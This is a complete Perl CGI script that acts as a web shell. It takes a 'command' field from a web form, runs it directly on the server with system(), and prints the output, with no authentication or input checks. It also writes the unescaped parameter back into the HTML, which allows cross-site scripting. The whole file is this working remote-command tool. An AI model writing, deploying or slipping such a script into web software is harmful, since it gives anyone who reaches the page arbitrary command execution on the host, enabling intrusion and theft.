#!/usr/bin/perl

use CGI qw(:standard);
use ptHTML;

$|       = 1;
$command = param("command");


&ptHTML::startHTML();

if ($command ne "")
    {
    print("<h1>$command:</h1>\n");
    print("<pre>\n");
    system("$command 2>&1");
    print("</pre>\n");
    }

&displayForm();


sub displayForm #()
    {
    print("<form method='post' action='" . &script_name . "'>\n");
    print("  <table border='0'>\n");
    print("    <tr>\n");
    print("      <th>Command:</th>\n");
    print("      <td><input type='text' name='command' value='$command' size='150'></td>\n");
    print("    </tr>\n");
    print("    <tr>\n");
    print("      <th></th>\n");
    print("      <td><input type='submit' value=' Submit '></td>\n");
    print("    </tr>\n");
    print("  </table>\n");
    print("</form>");
    print("</body>");
    print("</html>");
    }
